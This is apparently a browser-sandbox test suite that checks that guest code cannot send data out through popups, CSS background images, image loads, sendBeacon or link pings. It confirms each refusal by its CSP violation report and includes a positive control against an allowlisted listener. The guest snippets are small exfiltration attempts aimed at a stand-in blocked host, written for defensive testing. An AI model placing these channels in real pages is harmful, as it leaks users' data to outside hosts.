import { test, expect } from './fixture';
import { useRecorder } from './recorder';

/**
 * Exfiltration attempts from the guest. Evidence, per attempt (backlog T5):
 *   - the CSP violation the guest reports on the host (S5): positive evidence of each refusal;
 *   - the guest's own load outcome where the API has one;
 *   - a listener outside the browser (recorder.ts) that every attempt targets: it must stay silent.
 * Positive controls, last test: the same loads to an allowlisted origin succeed in the guest and reach
 * the listener, so a silent listener and a refused outcome mean something.
 */

const recorder = useRecorder();

test.describe('Escape attempts', () => {
    test.beforeEach(async ({ sandbox }) => {
        await sandbox.mount();
    });

    test('cannot open popups by default', async ({ sandbox, context }) => {
        let popups = 0;
        context.on('page', () => popups++);

        // Chromium and WebKit return null, Firefox throws
        await sandbox.run(`
            try { console.log('POPUP ' + (window.open('${recorder.blocked}/popup') ? 'opened' : 'blocked')); }
            catch (e) { console.log('POPUP blocked'); }
        `);

        expect(await sandbox.waitForLog('POPUP')).toBe('POPUP blocked');
        expect(popups).toBe(0);
        // research 13.2 is this channel's positive control: an allowed popup reaches the listener
        expect(recorder.paths('blocked')).toEqual([]);
    });

    test('cannot exfiltrate via CSS background images: refused and reported', async ({ sandbox }) => {
        await sandbox.run(`
            const style = document.createElement('style');
            style.textContent = 'body { background-image: url("${recorder.blocked}/track.svg"); }';
            document.head.appendChild(style);
        `);

        expect(await sandbox.waitForViolation('img-src', `${recorder.blocked}/track.svg`)).toBeTruthy();
        expect(recorder.paths('blocked')).toEqual([]);
    });

    test('cannot exfiltrate via image or beacon: each refused and reported', async ({ sandbox }) => {
        const outcome = await sandbox.inGuest(`
            const img = await new Promise(res => { const i = new Image(); i.onload = () => res('loaded'); i.onerror = () => res('refused'); i.src = '${recorder.blocked}/img.svg'; });
            let beacon;
            try { beacon = navigator.sendBeacon('${recorder.blocked}/beacon', 'x'); } catch (e) { beacon = 'threw ' + e.name; }
            return { img, beacon };
        `);

        expect(outcome.img).toBe('refused');
        // sendBeacon only queues: Chromium and WebKit return true and refuse the request afterwards,
        // Firefox returns false. The violation is the evidence in all three.
        expect(await sandbox.waitForViolation('img-src', `${recorder.blocked}/img.svg`)).toBeTruthy();
        expect(await sandbox.waitForViolation('connect-src', `${recorder.blocked}/beacon`)).toBeTruthy();
        expect(recorder.paths('blocked')).toEqual([]);
    });

    test('cannot exfiltrate via link ping: refused and reported where the engine sends pings', async ({ sandbox, browserName }) => {
        // A fragment link keeps the guest document: with the inert about:blank base (S15) a bare '#' would
        // navigate the guest frame away, and the test would then observe nothing.
        await sandbox.run(`
            const a = document.createElement('a');
            a.href = 'about:srcdoc#ping'; a.ping = '${recorder.blocked}/ping';
            document.body.appendChild(a); a.click();
            setTimeout(() => console.log('PING_CLICKED ' + location.href), 200); // Firefox moves to the fragment asynchronously
        `);
        expect(await sandbox.waitForLog('PING_CLICKED')).toBe('PING_CLICKED about:srcdoc#ping');

        // ledger: ping-attribute
        if (browserName === 'firefox') {
            // Firefox does not send pings by default (browser.send_pings is off): nothing to refuse. The
            // positive control below shows that it sends none to an allowed origin either.
            await sandbox.page.waitForTimeout(500);
            expect(await sandbox.violations()).toEqual([]);
        } else {
            expect(await sandbox.waitForViolation('connect-src', `${recorder.blocked}/ping`)).toBeTruthy();
        }
        expect(recorder.paths('blocked')).toEqual([]);
    });
});

test('positive control: the same loads to an allowlisted origin succeed and reach the listener, with no violation', async ({ sandbox, browserName }) => {
    expect(await sandbox.mount({ origins: { images: [recorder.allowed], connect: [recorder.allowed] } })).toBe('ready');
    const outcome = await sandbox.inGuest(`
        const style = document.createElement('style');
        style.textContent = 'body { background-image: url("${recorder.allowed}/track.svg"); }';
        document.head.appendChild(style);
        const img = await new Promise(res => { const i = new Image(); i.onload = () => res('loaded'); i.onerror = () => res('refused'); i.src = '${recorder.allowed}/img.svg'; });
        const beacon = navigator.sendBeacon('${recorder.allowed}/beacon', 'x');
        const a = document.createElement('a');
        a.href = 'about:srcdoc#ping'; a.ping = '${recorder.allowed}/ping';
        document.body.appendChild(a); a.click();
        return { img, beacon };
    `);

    expect(outcome).toEqual({ img: 'loaded', beacon: true });
    await recorder.waitFor('allowed', '/img.svg');
    await recorder.waitFor('allowed', '/track.svg');
    await recorder.waitFor('allowed', '/beacon');
    // ledger: ping-attribute
    if (browserName === 'firefox') {
        await sandbox.page.waitForTimeout(500);
        expect(recorder.paths('allowed')).not.toContain('/ping'); // pings are off in Firefox
    } else {
        await recorder.waitFor('allowed', '/ping');
    }
    expect(await sandbox.violations()).toEqual([]);
});
